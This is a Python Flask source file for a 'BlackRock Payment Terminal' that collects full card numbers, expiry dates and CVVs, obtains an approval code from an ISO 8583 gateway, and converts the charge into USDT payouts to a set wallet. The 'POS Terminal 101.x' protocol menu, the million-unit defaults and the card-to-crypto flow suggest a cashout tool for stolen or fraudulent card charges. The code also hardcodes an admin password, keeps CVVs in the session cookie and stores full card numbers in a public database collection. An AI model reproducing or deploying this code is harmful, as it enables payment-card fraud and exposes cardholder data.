# app.py
# This is the main Flask application for the BlackRock Payment Terminal.
# It handles user authentication, transaction flow, communication with the
# iso_gateway.py service (via HTTP) for card authorization, and real-time
# cryptocurrency payouts.
# Now with Firestore integration for persistent transaction history.

import os
import json # For parsing Firebase config
import hashlib
import logging
import random
import re
from datetime import datetime, date, timedelta
from functools import wraps
import requests # Used for HTTP communication with the iso_gateway.py service

from flask import Flask, render_template, request, redirect, session, url_for, flash, jsonify
from werkzeug.security import generate_password_hash, check_password_hash

# Firebase Admin SDK for server-side interaction with Firestore
import firebase_admin
from firebase_admin import credentials, firestore, auth

# Import custom modules
from blockchain_client import BlockchainClient
from utils import validate_card_number, format_amount, generate_transaction_id
from security_middleware import SecurityMiddleware, audit_log, require_role
from production_config import validate_production_config # Removed get_production_config
from application_config import get_wallet_config # For merchant wallet addresses

# Configure logging for the application
logging.basicConfig(level=logging.INFO) # Set to INFO for production, DEBUG for development
logger = logging.getLogger(__name__)

app = Flask(__name__)
# IMPORTANT: In a real production environment, app.secret_key MUST be a long,
# randomly generated string stored securely (e.g., in an environment variable).
# The default here is for development/demonstration purposes only.
app.secret_key = os.environ.get("SESSION_SECRET", "blackrock_terminal_secret_2025_DEFAULT_DO_NOT_USE_IN_PROD")
app.permanent_session_lifetime = timedelta(hours=8) # Sessions last for 8 hours

# Initialize the BlockchainClient for crypto payouts
blockchain_client = BlockchainClient()

# Initialize production security middleware
security_middleware = SecurityMiddleware(app)
# production_config = get_production_config() # Removed this line as get_production_config is not defined

# Validate production configuration on startup
if not validate_production_config():
    logger.error("Production configuration validation failed. Please review production_config.py.")
    # In a strict production environment, this might prevent the app from starting.

# User roles for access control
ROLES = {
    'ADMIN': 'admin',
    'OPERATOR': 'operator'
}

# Default admin credentials (for initial setup/demo)
# In a real system, these would be managed securely, e.g., in a database.
DEFAULT_ADMIN = {
    'username': 'blackrockadmin',
    'password_hash': generate_password_hash('Br_3339'), # Default password set back to Br_3339
    'role': ROLES['ADMIN']
}

def init_default_users():
    """
    Initializes default users (like the admin) if the user data file does not exist.
    In a production environment, user management would typically involve a database.
    """
    users_file = 'config/users.json'
    if not os.path.exists(users_file):
        os.makedirs('config', exist_ok=True) # Ensure the config directory exists
        with open(users_file, 'w') as f:
            json.dump({
                'blackrockadmin': DEFAULT_ADMIN
            }, f, indent=2)
        logger.info("Default admin user initialized.")

def get_users():
    """Retrieves user data from the users.json file."""
    users_file = 'config/users.json'
    if os.path.exists(users_file):
        with open(users_file, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    """Saves updated user data back to the users.json file."""
    users_file = 'config/users.json'
    with open(users_file, 'w') as f:
        json.dump(users, f, indent=2)

def login_required(role=None):
    """
    Decorator to enforce login and role-based access control for routes.
    Redirects to login if not authenticated, or to dashboard if insufficient permissions.
    """
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('logged_in'):
                flash('Please log in to access this page.', 'error')
                return redirect(url_for('login'))
            
            if role and session.get('user_role') != role:
                flash('Insufficient permissions.', 'error')
                return redirect(url_for('dashboard')) # Redirect to a safe page like dashboard
            
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def initialize_app_components():
    """Initializes necessary application components on startup."""
    init_default_users()

# Ensure session permanence before each request
@app.before_request
def make_session_permanent():
    session.permanent = True

@app.route('/')
def index():
    """Root URL redirects to login or dashboard based on session status."""
    if session.get('logged_in'):
        return render_template('index.html') # Render main terminal UI
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
@audit_log("User Login Attempt") # Audit log decorator for login attempts
def login():
    """Handles user login authentication."""
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        
        users = get_users()
        user = users.get(username)
        
        if user and check_password_hash(user['password_hash'], password):
            session['logged_in'] = True
            session['username'] = username
            session['user_role'] = user['role']
            session['login_time'] = datetime.now().isoformat()
            
            logger.info(f"User {username} logged in with role {user['role']}")
            flash(f'Welcome, {username}!', 'success')
            return redirect(url_for('index')) # Redirect to index (main terminal) after login
        else:
            flash('Invalid username or password.', 'error')
            logger.warning(f"Failed login attempt for username: {username}")
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    """Handles user logout, clearing the session."""
    username = session.get('username', 'Unknown')
    session.clear()
    flash(f'Goodbye, {username}!', 'info')
    logger.info(f"User {username} logged out")
    return redirect(url_for('login'))

@app.route('/dashboard')
@login_required() # Removed explicit endpoint
def dashboard():
    """Displays the main dashboard. Admin users see admin options."""
    user_role = session.get('user_role')
    
    if user_role == ROLES['ADMIN']:
        return render_template('admin_dashboard.html', 
                             username=session.get('username'))
    else:
        return redirect(url_for('index')) # Operators go directly to main terminal

@app.route('/admin/config', methods=['GET', 'POST'])
@login_required(role=ROLES['ADMIN']) # Removed explicit endpoint
def admin_config():
    """
    Admin configuration management for payout wallets and transaction limits.
    This uses environment variables or default values now.
    """
    # Load current values from environment variables or defaults
    current_erc20_wallet = os.environ.get('DEFAULT_ERC20_WALLET', '0xDefaultERC20WalletAddressForTesting')
    current_trc20_wallet = os.environ.get('DEFAULT_TRC20_WALLET', 'TDefaultTRC20WalletAddressForTesting')
    current_daily_limit = int(os.environ.get('DAILY_LIMIT_PER_TERMINAL', '10000000')) # Default 10M

    if request.method == 'POST':
        try:
            # Update wallet addresses (these would update environment variables or a database in a real system)
            erc20_wallet = request.form.get('erc20_wallet', '').strip()
            trc20_wallet = request.form.get('trc20_wallet', '').strip()
            daily_limit_str = request.form.get('daily_limit', '10000000')
            
            # Validate wallet addresses
            if erc20_wallet and not (erc20_wallet.startswith('0x') and len(erc20_wallet) == 42):
                flash('Invalid ERC-20 wallet address format.', 'error')
                return redirect(url_for('admin_config'))
            
            if trc20_wallet and not (trc20_wallet.startswith('T') and len(trc20_wallet) >= 34):
                flash('Invalid TRC-20 wallet address format.', 'error')
                return redirect(url_for('admin_config'))
            
            daily_limit = int(daily_limit_str)
            if daily_limit <= 0:
                flash('Daily limit must be a positive number.', 'error')
                return redirect(url_for('admin_config'))

            logger.info(f"Admin {session.get('username')} updated ERC20 wallet to: {erc20_wallet}")
            logger.info(f"Admin {session.get('username')} updated TRC20 wallet to: {trc20_wallet}")
            logger.info(f"Admin {session.get('username')} updated Daily Limit to: {daily_limit}")

            current_erc20_wallet = erc20_wallet
            current_trc20_wallet = trc20_wallet
            current_daily_limit = daily_limit
            
            flash('Configuration updated successfully! (Note: Changes might require re-deployment for persistence)', 'success')
            
        except ValueError:
            flash('Invalid input for daily limit. Please enter a number.', 'error')
        except Exception as e:
            logger.error(f"Configuration update failed: {str(e)}")
            flash('Configuration update failed. Please check your inputs.', 'error')
    
    return render_template('admin_config.html', 
                           erc20_wallet=current_erc20_wallet,
                           trc20_wallet=current_trc20_wallet,
                           daily_limit=current_daily_limit)

@app.route('/protocol', methods=['GET', 'POST'])
@login_required() # Removed explicit endpoint
def protocol():
    """Allows selection of the payment protocol."""
    PROTOCOLS = {
        "POS Terminal -101.1 (4-digit approval)": 4,
        "POS Terminal -101.4 (6-digit approval)": 6,
        "POS Terminal -101.6 (Pre-authorization)": 6,
        "POS Terminal -101.7 (4-digit approval)": 4,
        "POS Terminal -101.8 (PIN-LESS transaction)": 4,
        "POS Terminal -201.1 (6-digit approval)": 6,
        "POS Terminal -201.3 (6-digit approval)": 6,
        "POS Terminal -201.5 (6-digit approval)": 6
    }
    if request.method == 'POST':
        protocol = request.form.get('protocol')
        if protocol:
            session['protocol'] = protocol
            session['transaction_start'] = datetime.now().isoformat()
            session['code_length'] = PROTOCOLS.get(protocol, 6) 
            logger.info(f"Protocol selected: {protocol}")
            return redirect(url_for('amount'))
        else:
            flash('Please select a protocol.', 'error')
    
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required() # Removed explicit endpoint
def amount():
    """Allows input of the transaction amount and currency."""
    DAILY_LIMIT_PER_TERMINAL = int(os.environ.get('DAILY_LIMIT_PER_TERMINAL', '10000000')) # Default 10M

    if request.method == 'POST':
        amount_str = request.form.get('amount', '').replace(',', '').strip()
        currency = request.form.get('currency')

        if not currency or currency not in ['USD', 'EUR']:
            flash("Please select a valid currency.", "error")
            return render_template('amount.html')
        
        try:
            amount_float = float(amount_str)
            if amount_float <= 0:
                flash("Amount must be a positive number.", "error")
                return render_template('amount.html')

            current_date = date.today()
            last_txn_date_str = session.get('last_transaction_date')

            if last_txn_date_str and date.fromisoformat(last_txn_date_str) < current_date:
                session['daily_amount_spent'] = 0.0
                session['last_transaction_date'] = current_date.isoformat()

            current_spent = session.get('daily_amount_spent', 0.0)
            if (current_spent + amount_float) > DAILY_LIMIT_PER_TERMINAL:
                flash(f"Daily transaction limit of {DAILY_LIMIT_PER_TERMINAL:,.2f} {currency} exceeded for this terminal.", "error")
                return render_template('amount.html')

            session['amount'] = amount_str
            session['currency'] = currency
            session['daily_amount_spent'] = current_spent + amount_float

            logger.info(f"Amount set: {amount_str} {currency}")
            return redirect(url_for('payout'))
            
        except ValueError:
            flash('Please enter a valid amount.', 'error')
    
    default_amount = os.environ.get('DEFAULT_TRANSACTION_AMOUNT', '1000000') # Default 1M
    return render_template('amount.html', default_amount=default_amount)

@app.route('/payout', methods=['GET', 'POST'])
@login_required() # Removed explicit endpoint
def payout():
    """Allows selection of the crypto payout method and wallet."""
    default_erc20_wallet = os.environ.get('DEFAULT_ERC20_WALLET', '0xDefaultERC20WalletAddressForTesting')
    default_trc20_wallet = os.environ.get('DEFAULT_TRC20_WALLET', 'TDefaultTRC20WalletAddressForTesting')

    if request.method == 'POST':
        method = request.form['method']
        custom_wallet = request.form.get('custom_wallet', '').strip()

        if method == 'ERC20':
            wallet = custom_wallet if custom_wallet else default_erc20_wallet
            if custom_wallet and not (wallet.startswith('0x') and len(wallet) == 42):
                flash('Invalid ERC-20 wallet address format.', 'error')
                return redirect(url_for('payout'))
            session['payout_type'] = 'ERC20'
            session['wallet'] = wallet
            
        elif method == 'TRC20':
            wallet = custom_wallet if custom_wallet else default_trc20_wallet
            if custom_wallet and not (wallet.startswith('T') and len(wallet) >= 34):
                flash('Invalid TRC-20 wallet address format.', 'error')
                return redirect(url_for('payout'))
            session['payout_type'] = 'TRC20'
            session['wallet'] = wallet
        
        else:
            flash('Please select a payout method.', 'error')
            return redirect(url_for('payout'))
        
        logger.info(f"Payout method selected: {method}, Wallet: {session['wallet'][:10]}...")
        return redirect(url_for('card'))
    
    return render_template('payout.html',
                           default_erc20_wallet=default_erc20_wallet,
                           default_trc20_wallet=default_trc20_wallet)

@app.route('/card', methods=['GET', 'POST'])
@login_required() # Removed explicit endpoint
def card():
    """Allows input of card details."""
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "").replace("-", "")
        exp = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']
        
        if not validate_card_number(pan):
            flash('Invalid card number format.', 'error')
            return redirect(url_for('card'))
        
        if not re.match(r'^\d{4}$', exp):
            flash('Invalid expiry date format (MMYY).', 'error')
            return redirect(url_for('card'))
        
        if not re.match(r'^\d{3,4}$', cvv):
            flash('Invalid CVV format.', 'error')
            return redirect(url_for('card'))

        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})

        if pan.startswith("4"):
            session['card_type'] = "VISA"
        elif pan.startswith("5"):
            session['card_type'] = "MASTERCARD"
        elif pan.startswith("3"):
            session['card_type'] = "AMEX"
        elif pan.startswith("6"):
            session['card_type'] = "DISCOVER"
        else:
            session['card_type'] = "UNKNOWN"
        
        logger.info(f"Card entered: {session['card_type']} ending in {pan[-4:]}")
        return redirect(url_for('auth'))
    
    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required() # Removed explicit endpoint
def auth():
    """Allows input of the authorization code and triggers the transaction process."""
    expected_length = session.get('code_length', 6) 
    
    if request.method == 'POST':
        # FIX: Ensure 'code' is a string, even if request.form.get('auth') returns None
        code = request.form.get('auth', '') 
        
        if len(code) != expected_length or not code.isdigit():
            flash(f"Authorization code must be {expected_length} digits and numeric.", "error")
            return render_template('auth.html', code_length=expected_length, warning=f"Code must be {expected_length} digits and numeric.")

        session['auth_code'] = code

        # Prepare data for ISO 8583 message to be sent to the ISO Gateway Service
        iso_request_data = {
            'mti': '0100',  # Authorization Request
            'pan': session.get('pan'),
            'amount': int(float(session.get('amount')) * 100), # Amount in cents/smallest unit
            'expiry': session.get('exp'),
            'cvv': session.get('cvv'),
            'auth_code': session.get('auth_code'),
            'transaction_id': generate_transaction_id(), # Generate a new ID for the ISO message
            'currency_code': '840' if session.get('currency') == 'USD' else '978', # ISO 4217 for USD/EUR
            'protocol_type': session.get('protocol')
        }

        # Get ISO Gateway Service URL from environment variable
        # This URL will point to your deployed iso_gateway.py service
        ISO_GATEWAY_URL = os.environ.get('ISO_GATEWAY_URL', 'http://127.0.0.1:5001/process_iso_request') # Default to local gateway
        ISO_HTTP_TIMEOUT = int(os.environ.get('ISO_HTTP_TIMEOUT', 60)) # Timeout for HTTP request to gateway

        logger.info(f"Sending payment request to ISO Gateway Service at {ISO_GATEWAY_URL}...")
        iso_response = {}
        try:
            # Send HTTP POST request to the ISO Gateway Service
            response = requests.post(ISO_GATEWAY_URL, json=iso_request_data, timeout=ISO_HTTP_TIMEOUT)
            response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
            iso_response = response.json()
            logger.info(f"Received response from ISO Gateway Service: {iso_response}")

        except requests.exceptions.Timeout:
            logger.error(f"Error: Request to ISO Gateway Service timed out after {ISO_HTTP_TIMEOUT} seconds.")
            iso_response = {'status': 'ERROR', 'message': 'ISO Gateway Timeout', 'field39': '99'}
        except requests.exceptions.ConnectionError as e:
            logger.error(f"Error: Could not connect to ISO Gateway Service at {ISO_GATEWAY_URL}: {e}")
            iso_response = {'status': 'ERROR', 'message': f'ISO Gateway Unreachable: {e}', 'field39': '99'}
        except requests.exceptions.RequestException as e:
            logger.error(f"Error: An HTTP error occurred during the request to ISO Gateway: {e}", exc_info=True)
            iso_response = {'status': 'ERROR', 'message': f'ISO Gateway HTTP Error: {e}', 'field39': '99'}
        except json.JSONDecodeError:
            logger.error(f"Error: Invalid JSON response from ISO Gateway Service.", exc_info=True)
            iso_response = {'status': 'ERROR', 'message': 'Invalid Gateway Response Format', 'field39': '99'}
        except Exception as e:
            logger.critical(f"Critical Error: Unexpected error in auth route during gateway communication: {e}", exc_info=True)
            iso_response = {'status': 'ERROR', 'message': f'Unexpected Gateway Communication Error: {e}', 'field39': '99'}

        status = iso_response.get('status', 'Declined')
        auth_code_from_iso = iso_response.get('auth_code') # This is the auth code from the ISO server
        message = iso_response.get('message', 'Unknown error.')
        field39_resp = iso_response.get('field39', 'XX') # ISO 8583 Field 39 Response Code

        current_transaction_details = {
            'transaction_id': iso_request_data['transaction_id'], # Use the ID generated for the ISO message
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'card_number': session.get('pan'),
            'amount': float(session.get('amount')),
            'currency': session.get('currency'),
            'protocol_type': session.get('protocol'),
            'crypto_network_type': session.get('payout_type'),
            'status': status,
            'auth_code_required': False, # Will be set to True if ISO response implies manual entry
            'payout_status': None,
            'crypto_payout_amount': 0.0,
            'simulated_gas_fee': 0.0,
            'crypto_address': '',
            'iso_field39': field39_resp,
            'message': message, # Store the message from ISO server/gateway
            'iso_auth_code': auth_code_from_iso # Store the auth code received from ISO server
        }

        # Store initial transaction in Firestore for persistence
        if db: # Only attempt Firestore operations if db client is initialized
            try:
                get_transactions_collection_ref().document(current_transaction_details['transaction_id']).set(current_transaction_details)
                logger.info(f"Firestore: Stored initial transaction {current_transaction_details['transaction_id']}")
            except Exception as e:
                logger.error(f"Firestore Error: Could not store initial transaction {current_transaction_details['transaction_id']}: {e}")
                flash("Failed to log transaction to history.", "warning")
        else:
            logger.warning("Firestore not initialized. Transaction logging skipped.")

        # Determine next step based on ISO response
        if status == 'Approved' and auth_code_from_iso:
            # If ISO server approved and provided an auth code, proceed to manual entry
            current_transaction_details['auth_code_required'] = True # Mark that manual auth code is needed
            session['message'] = f'Payment authorized by ISO server. Please enter the APP/AUTH Code: {auth_code_from_iso}' # Show the code
            session['message_type'] = 'info'
            # Update transaction in Firestore to reflect auth_code_required status
            if db:
                try:
                    get_transactions_collection_ref().document(current_transaction_details['transaction_id']).update({'auth_code_required': True, 'iso_auth_code': auth_code_from_iso})
                except Exception as e:
                    logger.error(f"Firestore Error: Could not update auth_code_required for {current_transaction_details['transaction_id']}: {e}")
            
            return redirect(url_for('auth_code_entry_screen', transaction_id=current_transaction_details['transaction_id']))
        else:
            # If ISO server declined or didn't provide an auth code, go to reject screen
            session['message'] = f'Payment {status}: {message}'
            session['message_type'] = 'error'
            return redirect(url_for('reject_screen', transaction_id=current_transaction_details['transaction_id']))

    return render_template('auth.html', code_length=expected_length)

# --- Helper function for retrieving transaction details from Firestore ---
def get_transaction_details_from_firestore(transaction_id):
    """Retrieves transaction details from Firestore."""
    if db:
        try:
            doc_ref = get_transactions_collection_ref().document(transaction_id)
            doc = doc_ref.get()
            if doc.exists:
                return doc.to_dict()
        except Exception as e:
            logger.error(f"Firestore Error: Could not retrieve transaction {transaction_id}: {e}")
    return None

@app.route('/auth_code_entry/<transaction_id>')
@login_required() # Removed explicit endpoint
def auth_code_entry_screen(transaction_id):
    """Renders the dedicated authorization code entry screen."""
    transaction = get_transaction_details_from_firestore(transaction_id)
    # Ensure transaction exists and it was marked as requiring auth code
    if not transaction or not transaction.get('auth_code_required'):
        flash('Invalid or expired transaction for auth code entry.', 'error')
        return redirect(url_for('index'))
    
    # Pass the expected auth code from the ISO server to the template for display/hint
    # This is for the scenario where the ISO server provides the code and the merchant keys it in.
    iso_provided_auth_code = transaction.get('iso_auth_code', 'N/A')
    
    return render_template('auth_code_entry.html', 
                           transaction_id=transaction_id,
                           iso_provided_auth_code=iso_provided_auth_code)


@app.route('/complete_payment', methods=['POST'])
@login_required() # Removed explicit endpoint
def complete_payment():
    """
    Handles the completion of payment after manual APP/AUTH code entry.
    Triggers the crypto payout.
    """
    transaction_id = request.form['transaction_id']
    entered_auth_code = request.form['auth_code']

    transaction_details = get_transaction_details_from_firestore(transaction_id)
    if not transaction_details:
        flash('Invalid or expired transaction ID.', 'error')
        return redirect(url_for('index'))

    # Compare the entered auth code with the one received from the ISO server
    # This simulates the final verification step.
    expected_auth_code_from_iso = transaction_details.get('iso_auth_code')

    if entered_auth_code == expected_auth_code_from_iso:
        # Authorization successful, proceed with crypto payout
        recipient_wallet_info = get_wallet_config(transaction_details['crypto_network_type'])
        recipient_crypto_address = recipient_wallet_info['address']

        crypto_payout_result = blockchain_client.send_usdt( # Use blockchain_client for real payouts
            network=transaction_details['crypto_network_type'].lower(),
            to_address=recipient_crypto_address,
            amount_usd=transaction_details['amount']
        )

        transaction_details['crypto_payout_amount'] = crypto_payout_result.get('payout_amount_usdt', 0.0)
        transaction_details['simulated_gas_fee'] = crypto_payout_result.get('simulated_gas_fee_usdt', 0.0)
        transaction_details['payout_status'] = crypto_payout_result.get('status')
        transaction_details['status'] = 'Completed' # Overall transaction status
        transaction_details['auth_code_required'] = False # No longer required
        transaction_details['crypto_address'] = recipient_crypto_address # Store for display
        transaction_details['blockchain_hash'] = crypto_payout_result.get('transaction_hash', 'N/A') # Store real hash
        transaction_details['message'] = crypto_payout_result.get('message', 'Payment and Crypto Payout Completed.')

        # Update transaction in Firestore
        if db:
            try:
                get_transactions_collection_ref().document(transaction_id).set(transaction_details)
                logger.info(f"Firestore: Updated completed transaction {transaction_id}")
            except Exception as e:
                logger.error(f"Firestore Error: Could not update completed transaction {transaction_id}: {e}")
                flash("Failed to update transaction history.", "warning")
        
        if crypto_payout_result.get('status') == 'Success':
            flash("Payment Approved and Payout Initiated!", "success")
            return redirect(url_for('success_screen', transaction_id=transaction_id))
        else:
            flash(f"Payment Completed, but Payout Failed: {transaction_details['message']}", "warning")
            return redirect(url_for('reject_screen', transaction_id=transaction_id))

    else:
        transaction_details['status'] = 'Declined (Auth Code Mismatch)'
        transaction_details['message'] = 'Invalid APP/AUTH Code. Payment failed.'
        
        # Update transaction in Firestore as declined
        if db:
            try:
                get_transactions_collection_ref().document(transaction_id).set(transaction_details)
                logger.info(f"Firestore: Updated declined transaction {transaction_id}")
            except Exception as e:
                logger.error(f"Firestore Error: Could not update declined transaction {transaction_id}: {e}")
                flash("Failed to update transaction history.", "warning")

        flash('Invalid APP/AUTH Code. Payment failed.', 'error')
        return redirect(url_for('reject_screen', transaction_id=transaction_id))


@app.route('/success')
@login_required() # Removed explicit endpoint
def success_screen():
    """Renders the success screen with transaction details."""
    transaction_id = request.args.get('transaction_id')
    transaction = get_transaction_details_from_firestore(transaction_id)

    if not transaction:
        flash('Transaction details not found.', 'error')
        return redirect(url_for('index'))

    return render_template('success.html', transaction=transaction)

@app.route('/reject')
@login_required() # Removed explicit endpoint
def reject_screen():
    """Renders the reject screen with transaction details."""
    transaction_id = request.args.get('transaction_id')
    transaction = get_transaction_details_from_firestore(transaction_id)

    if not transaction:
        flash('Transaction details not found.', 'error')
        return redirect(url_for('index'))

    return render_template('reject.html', transaction=transaction)

@app.route('/transaction_history')
@login_required() # Removed explicit endpoint
def transaction_history_screen():
    """Renders the transaction history screen."""
    transactions = []
    if db:
        try:
            # Fetch all documents from the transactions collection, ordered by timestamp
            docs = get_transactions_collection_ref().order_by('timestamp', direction=firestore.Query.DESCENDING).limit(100).stream()
            for doc in docs:
                txn = doc.to_dict()
                # Convert Firestore Timestamp object to a readable string for display
                if 'timestamp' in txn and hasattr(txn['timestamp'], 'strftime'):
                    txn['timestamp'] = txn['timestamp'].strftime('%Y-%m-%d %H:%M:%S')
                transactions.append(txn)
            logger.info(f"Firestore: Fetched {len(transactions)} transactions for history.")
        except Exception as e:
            logger.error(f"Firestore Error: Could not fetch transaction history: {e}")
            flash('Error loading transaction history.', 'error')
    else:
        flash('Firestore not initialized. Transaction history not available.', 'warning')

    return render_template('transaction_history.html', transactions=transactions)


# --- Firebase Initialization (for Canvas environment) ---
# Global variables provided by the Canvas environment
app_id = os.environ.get('__app_id', 'default-app-id')
firebase_config_str = os.environ.get('__firebase_config', '{}')
initial_auth_token = os.environ.get('__initial_auth_token', None)

db = None # Firestore client
current_user_id = None # Authenticated user ID

# Initialize Firebase Admin SDK and Firestore client
# This block runs when the module is loaded.
if firebase_config_str:
    try:
        firebase_config = json.loads(firebase_config_str)
        if not firebase_admin._apps: # Prevent re-initialization
            firebase_admin.initialize_app(options={'projectId': firebase_config.get('projectId')})
        db = firestore.client()
        logger.info("Firebase Admin SDK initialized successfully.")

        # Authenticate with custom token if provided (Canvas environment)
        if initial_auth_token:
            try:
                decoded_token = auth.verify_id_token(initial_auth_token)
                current_user_id = decoded_token['uid']
                logger.info(f"Signed in with custom token. User ID: {current_user_id}")
            except Exception as e:
                logger.error(f"Error verifying initial auth token: {e}. Signing in anonymously for Firestore.")
                current_user_id = f"anonymous_{os.urandom(16).hex()}" # Fallback anonymous ID
        else:
            current_user_id = f"anonymous_{os.urandom(16).hex()}" # Anonymous ID for local dev
            logger.info(f"No initial auth token. Signed in anonymously. User ID: {current_user_id}")

    except Exception as e:
        logger.error(f"Error initializing Firebase Admin SDK: {e}. Firestore will not be available.")
        db = None # Ensure db is None if initialization fails
        current_user_id = None # Ensure user ID is None if initialization fails
else:
    logger.warning("Firebase config not found in environment variables. Firestore will not be available.")
    db = None
    current_user_id = None

# --- Firestore Helpers (defined after Firebase init) ---
def get_transactions_collection_ref():
    """Returns the Firestore collection reference for transactions."""
    if db and current_user_id:
        # Using a public collection path for simplicity in this demo, tied to app_id
        # For private user data, use: return db.collection(f"artifacts/{app_id}/users/{current_user_id}/transactions")
        return db.collection(f"artifacts/{app_id}/public/data/transactions")
    else:
        logger.error("Firestore DB or current_user_id not initialized. Cannot get collection reference.")
        # Return a dummy object to prevent runtime errors if Firestore is not available
        class DummyCollectionRef:
            def document(self, doc_id): return self
            def set(self, data): pass
            def get(self): return type('obj', (object,), {'exists': False, 'to_dict': lambda: {}})()
            def stream(self): return []
            def order_by(self, *args, **kwargs): return self
            def limit(self, *args, **kwargs): return self
            def add(self, data): pass # Add add method for compatibility
        return DummyCollectionRef()


# Initialize the application components when the module is loaded
initialize_app_components()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
